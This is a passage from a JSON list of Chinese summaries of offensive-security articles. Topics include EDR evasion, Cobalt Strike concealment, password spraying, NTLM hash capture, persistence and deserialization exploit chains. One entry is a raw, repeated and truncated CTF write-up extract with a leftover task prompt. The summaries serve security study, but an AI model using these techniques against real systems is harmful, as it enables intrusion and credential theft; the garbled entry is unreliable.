        "page_content": "该文档分析了命令执行漏洞的成因、危害、涉及函数和常⻅函数，并介绍了输出函数、伪协议、正则表达式、⽆数字字⺟构造 webshell 等相关知识，最后通过实战案例展示了如何绕过各种过滤条件来利用命令执行漏洞。",
        "FileName": "10947-浅析命令执行.pdf"
    },
    {
        "page_content": "该文档主要介绍了通过修改文件图标和添加 scf 文件来强制用户访问伪造的文件服务器，从而获取已认证用户的 NTLM v1/v2 Hash。这些方法可以作为后门或获取认证用户 Hash 的手段，但建议采取防御措施，如检查特殊文件 .scf 和 desktop.ini，避免添加 UNC 路径，并禁用 139 和 445 端口。",
        "FileName": "8544-配置文件重定向获取NTLM v12 Hash.pdf"
    },
    {
        "page_content": "**主题：** 蚁剑改造计划之实现其他参数的随机化\n\n**内容：** 本文介绍了一种修改蚁剑核心的方法，通过在其他参数前添加用户自定义长度的随机字符串来打乱 base64 解码，从而解决蚁剑对其他参数处理的硬伤，增强其对抗 WAF 的能力。该方法通过获取用户预定义的前缀偏移量，修改核心 payload 模板和参数组合模块，实现对其他参数的随机化编码，有效提高了蚁剑的隐蔽性和安全性。",
        "FileName": "7383-蚁剑改造计划之实现其他参数的随机化.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Java 反序列化的概念、原理和实现，包括 Java IO 流、序列化和反序列化过程、Java 反序列化和 PHP 反序列化的区别、Java 反射机制、URLDNS 反序列化利用链等内容。",
        "FileName": "12155-java反序列化预备全知.pdf"
    },
    {
        "page_content": "该文档主要介绍了 NodeJS 中的沙箱逃逸技术，包括 vm 和 vm2 模块的使用。vm 模块的沙箱隔离功能较弱，可以通过各种方法逃逸，而 vm2 模块在 vm 的基础上进行了优化，引入了 proxy 特性，增强了沙箱的安全性。文档还分析了 vm2 中存在的沙箱绕过漏洞，如 CVE-2019-10761 和 CVE-2021-23449，并介绍了相应的修复方法。",
        "FileName": "11859-NodeJS VM和VM2沙箱逃逸.pdf"
    },
    {
        "page_content": "本文档介绍了 APC 注入技术，该技术允许将代码注入到目标进程中。APC 注入通过向目标进程的 APC 队列添加一个 APC 对象来实现，该对象包含要执行的代码。当线程从等待状态恢复时，它会自动执行其 APC 队列中的 APC 函数。本文档提供了 APC 注入的原理、实现方法和示例代码，并讨论了该技术的优点和缺点。",
        "FileName": "11153-APC注入以及几种实现方式.pdf"
    },
    {
        "page_content": "该文档分析了 AspectJWeaver 漏洞利用链，该链利用了 AspectJWeaver、commons-collections 和 HashSet 的漏洞，最终实现任意文件写入。漏洞利用过程涉及通过反射将 TiedMapEntry 对象添加到 HashSet 的 HashMap 中，然后通过 LazyMap 和 SimpleCache.StoreableCachingMap 将文件内容写入指定路径。",
        "FileName": "12037-AspectJWeaver链分析.pdf"
    },
    {
        "page_content": "该文档讲述了作者通过分析前端 JavaScript 代码泄露的敏感信息，发现未授权访问 URL 接口和弱密码，从而成功登录后台系统并上传恶意文件，最终获取系统控制权的过程。文档强调了在实战中仔细检查 JavaScript 文件的重要性，因为它们可能包含有价值的信息，为攻击者提供突破口。",
        "FileName": "8441-从JS敏感信息泄露到GETSHELL.pdf"
    },
    {
        "page_content": "本文介绍了三种绕过 EDR（端点检测和响应）技术的免杀技术：“删除 ntdll 中的钩子”、“伪造线程调用栈”和“beacon 的内存加密”。这些技术通过解除对 ntdll.dll 的钩子、扰乱线程调用栈和加密 beacon 线程的内存，使恶意软件能够逃避 EDR 的检测和响应机制。",
        "FileName": "11532-红队开发基础-基础免杀(三).pdf"
    },
    {
        "page_content": "**文档主题：** 分析如下文档并完成以下任务：\n                    **文档内容：**\n```\n1.登录 RWCTF 5th ShellFind 分析 RWCTF 5th ShellFind 分析 z1r0   /  2023-04-10 19:06:00  /  发表于江苏  /  浏览数  3472 题⽬类型为 Pwn ，难度描述为  difficulty:Normal ，具体描述如下： Hello\tHacker. You\tdon't\tknow\tme,\tbut\tI\tknow\tyou. I\twant\tto\tplay\ta\tgame.\tHere's\twhat\thappens\tif\tyou\tlose. The\tdevice\tyou\tare\twatching\tis\thooked\tinto\tyour\tSaturday\tand\tSunday. When\tthe\ttimer\tin\tthe\tback\tgoes\toff, your\tcuriosity\twill\tbe\tpermanently\tripped\topen. Think\tof\tit\tlike\ta\treverse\tbear\ttrap. Here,\tI'll\tshow\tyou. There\tis\tonly\tone\tUDP\tservice\tto\tshell\tthe\tdevice. It's\tin\tthe\tstomach\tof\tyour\tcold\tfirmware. Look\taround\tHacker.\tKnow\tthat\tI'm\tnot\tlying. Better\thurry\tup. Shell\tor\tout,\tmake\tyour\tchoice. 题⽬⽂件： https://github.com/Larryxi/rwctf-5th-shellfind sudo\tdocker\trun\t--name\tshellfind\t-d\t--privileged\t-p\t 4444 /udp\t--rm\t1arry/shellfind ⾸先把题⽬给的固件解包，然后发现是 D-link DCS 960L ，再从官⽹上下载个最新的固件 最新的固件下载链接： https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DCS-960L 下载之后直接 diff ⽐较⼀下，最⼤的差距是下⾯这个\n2.D-link DCS 960L ，再从官⽹上下载个最新的固件 最新的固件下载链接： https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DCS-960L 下载之后直接 diff ⽐较⼀下，最⼤的差距是下⾯这个 Binary\tfiles\tsquashfs-root/usr/sbin/ipfind\tand\tsquashfs-root2/usr/sbin/ipfind\tdiffer 刚好 ipfind 是 udp 服务，符合题⽬描述，所以对这两个⽂件进⾏分析 ⽤ bindiff 查看⼀下，发现 \t 401ca4 \t 这个地⽅被⼿动 patch 过了，属于 \t 40172C \t 函数 题⽬远程环境配置 初步分析现在初步分析之后确定 ipfind 程序为⽬标程序 先完整分析⼀下 ipfind ，⾸先是下⾯这个部分 ifname \t = \t argv [ 1 ]; \t\t\t\t v4 \t = \t ipfind_pid () \t < \t 0 ; \t\t\t\t result \t = \t 0 ; \t\t\t\t if \t ( \t ! v4 \t ) \t\t\t\t { \t\t\t\t\t\t setup_signal_handlers (); \t\t\t\t\t\t server_sockfd \t = \t socket ( 2 , \t 1 , \t 17 ); \t\t\t\t\t\t\t\t\t //\tudp \t\t\t\t\t\t if \t ( \t server_sockfd \t == \t - 1 \t ) \t\t\t\t\t\t { \t\t\t\t\t\t\t\t my_puts ( \"Can't\tget\tserver\tsocket \\n \" ); \t\t\t\t\t\t\t\t return \t - 1 ; \t\t\t\t\t\t } \t\t\t\t\t\t else 如果 ipfind 正常运⾏ 注册信号处理函数 创建 udp 套接字 v12 . sa_family \t = \t 2 ; \t\t\t\t\t\t\t\t memset ( & v12 . sa_data [ 2 ], \t 0 , \t 12 ); \t\t\t\t\t\t\t\t * v12 . sa_data \t = \t 62720 ; \t\t\t\t\t\t\t\t strncpy ( v13 , \t ifname , \t 0x10u ); \t\t\t\t\t\t\t\t if \t ( \t setsockopt (\n3.. sa_data [ 2 ], \t 0 , \t 12 ); \t\t\t\t\t\t\t\t * v12 . sa_data \t = \t 62720 ; \t\t\t\t\t\t\t\t strncpy ( v13 , \t ifname , \t 0x10u ); \t\t\t\t\t\t\t\t if \t ( \t setsockopt ( server_sockfd , \t 0xFFFF , \t 25 , \t v13 , \t 0x20u ) \t >= \t 0 \t ) \t\t\t\t\t\t\t\t { \t\t\t\t\t\t\t\t\t\t if \t ( \t setsockopt ( server_sockfd , \t 0xFFFF , \t 32 , \t & v9 , \t 4u ) \t >= \t 0 \t ) \t\t\t\t\t\t\t\t\t\t { \t\t\t\t\t\t\t\t\t\t\t\t if \t ( \t setsockopt ( server_sockfd , \t 0xFFFF , \t 4 , \t & v10 , \t 4u ) \t >= \t 0 \t ) \t\t\t\t\t\t\t\t\t\t\t\t { \t\t\t\t\t\t\t\t\t\t\t\t\t\t if \t ( \t bind ( server_sockfd , \t & v12 , \t 0x10u ) \t >= \t 0 \t ) \t\t\t\t\t\t\t\t\t\t\t\t\t\t { 如果套接字创建成功，则绑定到 62720 端⼝上 漏洞分析struct \t sockaddr \t { unsigned \t short \t sa_family ; \t /*\taddress\tfamily,\tAF_xxx\t*/ char \t sa_data [ 14 ]; \t /*\t14\tbytes\tof\tprotocol\taddress\t*/ }; sa_family 为 2 代表是 udp ， sa_data=62720 则代表要绑定到 62720 端⼝上 如果绑定成功就到了最核⼼的地⽅sub_4013D0 ( \"IPFind\tstart(%s)... \\n \" , \t ifname ); \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t v18 \t = \t user_data ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t v21 \t = \t & user_data [ 17 ]; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t addr_len \t = \t & v11 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t v20 \t = \t \"FIVI\" ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t v22 \t = \t & v16 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t v23 \t = \t & unk_402E90 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t while \t ( \t 1 \t ) \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t { \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t v5 \t = \t & v14 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t if \t ( \t dword_413168 \t ) \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t break ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t do \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t { \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t * v5 \t = \t 0 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t v5 \t += \t 4 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t } \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t while \t ( \t v5 \t != \t user_data \t ); \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t v6 \t = \t server_sockfd ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t v14 . __fds_bits [ server_sockfd \t >> \t 5 ] \t |= \t 1 \t << \t server_sockfd ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t if \t ( \t select ( v6 \t + \t 1 , \t & v14 , \t 0 , \t 0 , \t 0 ) \t >= \t 0 \t ) \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t { \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t if \t ( \t (( v14 . __fds_bits [ server_sockfd \t >> \t 5 ] \t >> \t server_sockfd ) \t & \t 1 ) \t != \t 0 \t ) \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t {\n4.v18 \t = \t user_data ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t v21 \t = \t & user_data [ 17 ]; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t addr_len \t = \t & v11 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t v20 \t = \t \"FIVI\" ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t v22 \t = \t & v16 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t v23 \t = \t & unk_402E90 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t while \t ( \t 1 \t ) \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t { \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t v5 \t = \t & v14 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t if \t ( \t dword_413168 \t ) \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t break ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t do \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t { \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t * v5 \t = \t 0 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t v5 \t += \t 4 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t } \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t while \t ( \t v5 \t != \t user_data \t ); \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t v6 \t = \t server_sockfd ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t v14 . __fds_bits [ server_sockfd \t >> \t 5 ] \t |= \t 1 \t << \t server_sockfd ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t if \t ( \t select ( v6 \t + \t 1 , \t & v14 , \t 0 , \t 0",
        "FileName": "12405-RWCTF 5th ShellFind分析.pdf"
    },
    {
        "page_content": "该文档分析了 Java 反序列化工具 ysoserial 中的 URLDNS 利用链，该利用链通过发送一个 URL 到目标，如果目标反序列化该内容，则会向目标 URL 发起请求，从而判定目标存在反序列化漏洞。文档详细介绍了 Java 对象序列化和反序列化的过程，以及 ysoserial 如何利用 URLDNS 发起 DNS 请求。",
        "FileName": "9116-JAVA反序列化-ysoserial-URLDNS原理分析.pdf"
    },
    {
        "page_content": "该文档介绍了一种将特殊格式数据包解密后与 Xray 联动进行扫描的方法。通过在 Burp 中使用 autoDecoder 插件解密数据包，并通过 Xray 监听和转发流量，可以将解密后的数据包发送到 Burp 进行扫描，从而简化了测试过程。该方法通过自定义数据包内容，使其符合 Xray 和服务器的识别格式，实现了数据的有效传输和扫描。",
        "FileName": "12756-记一次特殊格式数据包加密后的burp与xray联动.pdf"
    },
    {
        "page_content": "文档探讨了 NtCreateUserProcess 系统调用的功能和用法，该调用允许在用户模式下创建新的进程。它详细介绍了调用的参数、标志和数据结构，并提供了示例代码来演示如何使用 NtCreateUserProcess 创建进程，包括如何欺骗父进程标识符 (PPID) 和设置进程的完整性级别。",
        "FileName": "12129-NtCreateUserProcess 初探与玩法.pdf"
    },
    {
        "page_content": "该文档分析了 House of Botcake 漏洞利用技术，该技术利用了 glibc 中 tcache 结构中的 key 值来绕过 double free 检测，从而实现任意堆块分配和释放。文档还提供了利用该技术的详细步骤和示例代码。",
        "FileName": "12653-House of Botcake.pdf"
    },
    {
        "page_content": "该文档详细介绍了从 Web 渗透到内网渗透的步骤，包括利用 OA 系统漏洞获取初始访问权限，使用 MSF 生成木马上线，搭建 socks5 隧道进行内网横向移动，以及通过弱口令获取内网 Linux 和 Windows 服务器的控制权。文档强调了内网安全的重要性，并建议修复弱口令漏洞。",
        "FileName": "10058-渗透测试：从Web到内网.pdf"
    },
    {
        "page_content": "域委派是一种机制，允许域内用户将自己的权限委派给服务帐户，以便服务帐户能够以用户的权限在域内执行操作。域委派分为无约束委派、传统约束委派和基于资源的约束委派。其中，无约束委派允许服务帐户获取用户的 TGT，而约束委派限制了服务帐户的委派范围。基于资源的约束委派则允许服务帐户模拟用户访问自己的资源。",
        "FileName": "11487-域委派原理与利用（个人学习的理解）.pdf"
    },
    {
        "page_content": "本文介绍了利用 PHP 垃圾回收机制构造 POP 链的解法，该解法通过反序列化数组并利用第一个索引触发垃圾回收，从而绕过 __destruct 方法中的异常中断，最终打印出 flag。",
        "FileName": "10961-利用PHP垃圾回收机制构造POP链.pdf"
    },
    {
        "page_content": "本文介绍了 Java 代码审计中 RCE 漏洞的原理和实际案例，包括漏洞定义、可能出现的场景、修复方法和一个 CVE-2010-1871 的详细分析，涵盖了漏洞的搭建、漏洞分析、修复方案和参考链接。",
        "FileName": "7995-【Java 代码审计入门-05】RCE 漏洞原理与实际案例介绍.pdf"
    },
    {
        "page_content": "文档主题是栈迁移原理，内容介绍了栈迁移的原理、实现方法和应用场景，包括利用 leave;ret 指令进行两次栈迁移，将栈帧迁移到 bss 段，从而实现 getshell。",
        "FileName": "12738-栈迁移原理深入理解以及实操.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2014-6332 漏洞，该漏洞影响 Internet Explorer，允许远程代码执行。漏洞存在于 oleaut32.dll 中的 SafeArrayRedim 函数中，该函数在重新定义数组时未对传入参数进行有效验证，导致越界读写和任意代码执行。文档详细分析了漏洞的利用过程，包括如何通过重新定义数组来实现任意地址读写，以及如何利用该漏洞绕过安全模式并执行任意代码。",
        "FileName": "9279-Internet Explorer漏洞分析(三)[下]——CVE-2014-6332.pdf"
    },
    {
        "page_content": "该文档详细介绍了 CVE-2020-2883 漏洞，该漏洞是一个 Oracle WebLogic Server 中的严重反序列化漏洞，允许未经身份验证的攻击者通过 T3 协议网络访问并破坏易受攻击的服务器。文档分析了漏洞的根源，并提供了利用该漏洞的两个 Gadget，以及如何通过反射机制和序列化生成有效载荷的详细步骤。",
        "FileName": "8577-CVE-2020-2883Weblogic反序列化.pdf"
    },
    {
        "page_content": "Sayo-proxyscan 是一款轻量快速的代理扫描工具，支持 SOCKS4/SOCKS4a/SOCKS5/HTTP/HTTPS 代理扫描，可用于渗透测试和爬虫，提供详细的扫描结果，并支持自定义扫描参数和输出文件。",
        "FileName": "12854-Say0l的安全开发-代理扫描工具-Sayo-proxyscan【红队工具】.pdf"
    },
    {
        "page_content": "该文档详细介绍了在 ByteCTF 比赛中绕过 PHP disable_functions 的多种方法，包括利用 iconv、LD_PRELOAD、/proc/self/mem 和 pwn/web 姿势。最终，通过 iconv 漏洞和自定义 gconv 模块实现了远程代码执行。",
        "FileName": "8669-ByteCTF WP-无需mail bypass disable_functions.pdf"
    },
    {
        "page_content": "本文探讨了 Java 中 `forName` 方法的用法和作用域，该方法用于加载类。`forName` 有两种重载形式，一种使用指定的类加载器，另一种使用调用类的类加载器。`forName` 的作用域取决于所使用的类加载器，它可以加载由启动类加载器、扩展类加载器或系统类加载器加载的类。",
        "FileName": "12170-类加载之forName作用域.pdf"
    },
    {
        "page_content": "本文介绍了如何修改 Net-SNMP 源代码，使其通过 stdin/stdout 完成 UDP 通信，从而使用 AFL-Fuzz 对其进行模糊测试。此外，还分析了 CVE-2018-18066，这是一个由 Net-SNMP 5.8 之前版本错误的 SNMP 解析方式导致的 DoS 漏洞。",
        "FileName": "7854-UDP通信程序的fuzz思路与CVE-2018-18066分析.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用管道特权提升和 Bitdefender 反病毒软件中的两个漏洞（CVE-2021-4198 和 CVE-2021-4199）。第一个漏洞导致 Bitdefender 进程拒绝服务，而第二个漏洞则通过利用链接跟踪漏洞实现本地特权提升。该文档还提供了利用这些漏洞的详细步骤，包括使用 IO Ninja 工具生成管道服务器、分析崩溃转储文件、利用 DACL 和 DLL 链接漏洞以及利用崩溃转储进程本身。",
        "FileName": "12877-管道特权利用提升和比特梵德反病毒软件漏洞解析教程（CVE-2021-4198）.pdf"
    },
    {
        "page_content": "本文介绍了使用 Chrome Debug 和一些挖洞经验绕过 Web 签名的方法，包括通过替换响应包的值、使用 Chrome Debug 以及一些实用的 Web 渗透测试技巧。通过这些方法，即使是缺乏深入开发知识的人员也可以快速绕过简单的 Web 签名，从而发现漏洞。",
        "FileName": "8976-chrome debug和我一些挖洞的经验 （Adam）.pdf"
    },
    {
        "page_content": "本文主要介绍了三个权限维持的小技巧，包括文件自删除、创建互斥体和使用 Windows 计划任务重启上线。这些技巧可以帮助攻击者在目标系统上持久化其恶意软件，从而实现持续访问和控制。",
        "FileName": "10449-Window向之权限维持三小技.pdf"
    },
    {
        "page_content": "Java 类加载器是 Java 运行时环境的一部分，负责动态加载 Java 类到 Java 虚拟机的内存空间中，用于加载系统、网络或者其他来源的类文件。类加载器可以分为 JVM 默认类加载器（引导类加载器、扩展类加载器和系统类加载器）和用户自定义类加载器，它们之间遵循双亲委派机制，即先委托父类加载器加载类，当父类加载器无法加载时，子类加载器才会进行加载。自定义类加载器可以通过继承 java.lang.ClassLoader 类实现，并覆盖 findClass() 方法来加载自定义的类。",
        "FileName": "9002-JAVA安全基础（一）--类加载器（ClassLoader）.pdf"
    },
    {
        "page_content": "Bandit 是一款用于检查 Python 代码中安全问题的静态分析工具，它通过解析源代码的 AST 抽象语法树，并对 AST 节点运行对应的插件来检测漏洞。Bandit 内置了多种漏洞检测插件，涵盖文件权限、硬编码密钥、硬编码临时目录、密码未设置隐私、硬编码 SQL 语句等类型的漏洞。用户还可以编写自定义的漏洞插件来扩展 Bandit 的检测能力。",
        "FileName": "11341-bandit工具分析.pdf"
    },
    {
        "page_content": "本文探讨了如何获取和访问 IPv6 地址，包括使用 VPS、配置 AWS 和华为云，以及设置代理服务器。它还介绍了如何更改云服务器的 IPv6 地址，收集目标 IPv6 资产，并使用各种工具扫描 IPv6 地址范围。",
        "FileName": "11986-ipv6攻击视角.pdf"
    },
    {
        "page_content": "该文档记录了一次前台任意文件下载漏洞挖掘过程。作者通过分析后台系统发现存在任意文件下载漏洞，但由于权限限制无法直接利用。随后，作者利用 Shiro 权限绕过技术，通过构造特定 URL 路径，成功绕过权限限制，实现了前台任意文件下载。",
        "FileName": "10328-记一次前台任意文件下载漏洞挖掘.pdf"
    },
    {
        "page_content": "该文档详细介绍了对 YCCMS 系统进行代码审计的过程，发现了多个漏洞，包括 XSS 注入、命令执行、任意文件删除、暴力破解和任意密码修改。审计利用了自动化审计工具和手动代码分析，并提供了利用漏洞的有效载荷和缓解措施。",
        "FileName": "9907-代码审计---YCCMS系统.pdf"
    },
    {
        "page_content": "本文档探讨了应用层隧道技术，重点介绍了 SSH、HTTP/HTTPS 和 DNS 协议在内网渗透中的应用。它详细解释了本地端⼝转发、远程端⼝转发和动态端⼝转发等技术，并提供了使用 reGeorg+proxifier 代理和 dnscat2 建立 DNS 隧道的示例。此外，本文档还讨论了防御 SSH 隧道攻击和 DNS 隧道攻击的策略。",
        "FileName": "7956-内网渗透之应用层隧道技术.pdf"
    },
    {
        "page_content": "本文档探讨了用于代码混淆和 shellcode 加密的常用方法，包括 base64、PyCryptodome、PEM 和 AES。这些方法可以帮助绕过杀毒软件检测，但需要根据具体情况进行调整和组合。",
        "FileName": "10999-免杀之代码混淆.pdf"
    },
    {
        "page_content": "本文介绍了如何使用 CDN 和修改特征来隐匿 Cobalt Strike，以避免被态势感知设备识别。通过注册免费域名、配置 CDN 平台、创建证书、修改 VPS 配置、修改 teamserver 特征和启动 teamserver，可以实现流量和特征隐匿，从而增强渗透测试的安全性。",
        "FileName": "11099-CDN及特征隐匿Cobalt Strike.pdf"
    },
    {
        "page_content": "该文档分析了 Microsoft Office Word 中的 CVE-2010-3333 栈溢出漏洞，详细介绍了漏洞成因、影响版本、分析环境、POC 构造、参数传递、复制长度计算、POC 内容、漏洞触发位置、调用栈回溯、参数分析、RTF 规范、POC 构造过程、Shellcode 编写、内存处理机制等方面，并提供了漏洞利用的具体步骤和截图。",
        "FileName": "8636-Note——CVE-2010-3333.pdf"
    },
    {
        "page_content": "**主题：** 利用 CVE-2021-36934 导出 Windows 系统密码哈希\n\n**内容：** 该文档介绍了如何利用 CVE-2021-36934 漏洞，通过访问卷影副本中的 SAM 文件，导出 Windows 系统的密码哈希。该漏洞允许普通用户绕过本机被占用的 SAM 文件访问权限，从而获取密码哈希，用于伪造 PTH 和票据等。文档还提供了使用 C# 脚本从卷影副本导出文件的示例代码。",
        "FileName": "9944-利用CVE-2021–36934获取用户密码哈希.pdf"
    },
    {
        "page_content": "该文档介绍了 2023 XCTF FINAL web 题的复现，包括通过 React Dev Tool 或前端 js 搜索来获取登录界面中的账号密码，以及利用 MariaDB 10.0.3 中的 EXECUTE IMMEDIATE 语句绕过过滤创建表并插入数据，最终获取 flag。",
        "FileName": "12390-2023XCTF FINAL web题复现.pdf"
    },
    {
        "page_content": "该文档分析了腾讯企业邮箱的登录逻辑，发现其对 POP3 和 SMTP 登录进行了限制，但前端 Web 登录存在密码喷洒漏洞。文档提供了利用 RSA 加密算法对密码进行加密的 Python 脚本，并介绍了在收集到目标密码后进行密码喷洒的方法。此外，文档还讨论了在目标未绑定微信或手机号码时利用密保邮箱作为后门的策略。",
        "FileName": "11529-某企业邮箱攻击面之密码喷洒.pdf"
    },
    {
        "page_content": "该文档介绍了检测网页是否为 404 页面（即页面未找到）的各种方法，包括检查 HTTP 状态码、页面内容和页面截图。它还提供了针对不同 404 页面特征的检测配置，并讨论了如何通过扩展配置来提高检测的可扩展性。",
        "FileName": "12603-安全开发之404页面检测.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何绕过 nRF51 系列单片机的读取保护，该保护通过 RBPCONF 寄存器配置，只能通过擦除整个内存才能修改。作者利用 ARM thumb 指令的 16 位长度限制和寄存器寻址，通过修改 PC 寄存器和控制存储地址的寄存器，成功读取了固件，绕过了读取保护。",
        "FileName": "8356-nRF51系列单片机读取保护绕过.pdf"
    },
    {
        "page_content": "该文档记录了一次针对使用 JWT 进行认证的系统的越权渗透测试。该漏洞利用了 JWT 令牌和 UID 验证机制的缺陷，允许攻击者通过修改 JWT 令牌中的 UID 来访问其他用户的帐户。该漏洞的利用过程涉及获取有效的 JWT 令牌，修改令牌中的 UID，然后使用修改后的令牌访问目标用户的帐户。",
        "FileName": "8288-记录一次JWT的越权渗透测试.pdf"
    },
    {
        "page_content": "本文分析了 C++ 中类型混淆的原理，并介绍了一个 Windows 内核中 Direct X 模块的漏洞。该漏洞利用了类型混淆，通过手动构造一个标志，导致后续逻辑认为申请了更大的内存，而实际只申请了较小的内存，从而导致越界写的问题。",
        "FileName": "8594-类型混淆漏洞模式浅析.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2017-9128 漏洞，该漏洞存在于 libquicktime 1.2.4 中，允许攻击者通过精心构造的 MP4 文件触发堆溢出和应用程序崩溃，导致拒绝服务。文档详细介绍了漏洞的复现过程，包括分析错误信息、编译安装 libquicktime、触发漏洞并分析函数回溯，最终确定漏洞是由某些结构体未初始化导致的。",
        "FileName": "7585-CVE-2017-9128复现与分析.pdf"
    },
    {
        "page_content": "本文档总结了四种常见的 PHP 反序列化漏洞，包括反序列化漏洞产生的原因、漏洞原理、漏洞实例和绕过方法，并通过一个 CTF 题实例详细讲解了 PHP 反序列化漏洞的利用过程。",
        "FileName": "12507-php反序列化完整总结.pdf"
    },
    {
        "page_content": "该文档详细介绍了攻击者如何利用 EmpireCMS 网站管理系统中的多个漏洞来获取对目标网站的访问权限。攻击者首先通过源码泄露获得了管理员凭据，然后利用历史漏洞，包括模版调用、数据库模型导入、SQL 语句执行和备份数据，最终成功在目标网站上获取了 webshell。",
        "FileName": "10740-源码泄露到getshell(2).pdf"
    },
    {
        "page_content": "**主题：** Apache Commons Configuration 2.7 版本中的命令执行漏洞 (CVE-2022-33980)\n\n**内容：** 该漏洞允许攻击者通过变量插值执行任意命令，影响范围包括使用 Commons Configuration 2.7 版本的 Java 应用程序。漏洞的根源在于变量插值机制，它允许攻击者使用特定前缀（如 \"script\"、\"url\" 和 \"dns\"）来执行恶意代码。官方已发布修复程序，建议受影响用户尽快升级。",
        "FileName": "11723-CVE-2022-33980命令执行漏洞分析.pdf"
    },
    {
        "page_content": "本文档介绍了内网渗透的基本概念和技术，包括提权、信息收集、Hash读取、Hash传递、IPC$和黄金票据。通过这些技术，攻击者可以获取内网权限并控制域控服务器。",
        "FileName": "10439-内网渗透初探(一)  小白简单学习内网渗透.pdf"
    },
    {
        "page_content": "该文档介绍了一种自动化工具，用于批量获取域内计算机的敏感文件，包括桌面文件和 D 盘文件。该工具通过连接 LDAP 并指定过滤条件来获取计算机名，然后探测计算机是否存活，并获取目标计算机的桌面和 D 盘文件，将结果输出到指定目录。",
        "FileName": "11667-域内批量获取敏感文件.pdf"
    },
    {
        "page_content": "该文档分析了 HackTM CTF 2020 中的一个 Node.js 题目，该题目涉及在线画图和用户验证。通过利用 JavaScript 中大小写特性绕过用户验证，并通过修改权限查看配置信息，可以将管理员 ID 设置为 0，从而获取 Flag。",
        "FileName": "7177-HackTM中一道Node.js题分析(Draw with us).pdf"
    },
    {
        "page_content": "该文档描述了利用 Citrix Xen APP 越权访问漏洞的过程，该漏洞允许普通用户在 Citrix APP 中越权调用资源管理器窗口，从而执行系统命令并绕过杀毒软件，最终实现内网穿透。",
        "FileName": "8604-记一次Citrix Xen APP越权访问利用.pdf"
    },
    {
        "page_content": "**主题：** ThinkPHP6.0.12 反序列化 RCE 挖掘\n\n**内容：** 通过分析 ThinkPHP6.0.12 的代码，作者发现了一个反序列化漏洞，该漏洞允许攻击者通过构造恶意序列化数据来执行任意代码。作者详细介绍了漏洞的挖掘过程，并提供了利用该漏洞的完整 EXP。",
        "FileName": "11382-ThinkPHP6.0.12反序列化RCE挖掘.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 LightCMS 文件上传和 PHP 反序列化漏洞实现远程代码执行 (RCE)。漏洞利用涉及上传一个伪装成图像的恶意 PHP 文件，该文件包含一个经过精心设计的 URL，可以触发 PHP 的 phar 协议，从而执行任意命令。该漏洞利用需要修改 LightCMS 的 catchImage 方法，以绕过对 URL 的检查并允许执行 phar 协议。",
        "FileName": "9561-LightCMS 文件上传&&phar反序列化rce漏洞复现.pdf"
    },
    {
        "page_content": "本文探讨了 SQL 预编译和模拟预编译之间的区别，以及它们在 PHP、Python 和 MySQL 中的默认实现。预编译通过将参数值替换为占位符来防止 SQL 注入，而模拟预编译在客户端模拟参数绑定过程。MySQL 默认使用预编译，而 PDO 和 MySQLdb 默认使用模拟预编译。在使用 MySQL 预编译时，转义操作由服务器端执行，而模拟预编译则由客户端执行。虽然预编译通常可以防止 SQL 注入，但如果 SQL 模板中的参数名可控，则仍然存在风险。",
        "FileName": "7132-Sql预编译与模拟预编译研究.pdf"
    },
    {
